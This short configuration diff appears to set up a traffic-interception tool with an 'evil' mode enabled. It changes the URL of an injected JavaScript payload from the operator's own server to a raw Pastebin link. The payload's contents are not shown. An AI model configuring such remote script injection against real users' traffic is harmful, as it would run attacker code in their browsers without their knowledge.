@@ -17,7 +17,7 @@
       allowConnect = true;
       beEvil = true;
       ignoreHosts = [ "my.domain:1337" ];
-      payloadUrl = "http://my.domain:1337/payload.js";
+      payloadUrl = "https://pastebin.com/raw/cQLHTKsL";
     })
   ];
 
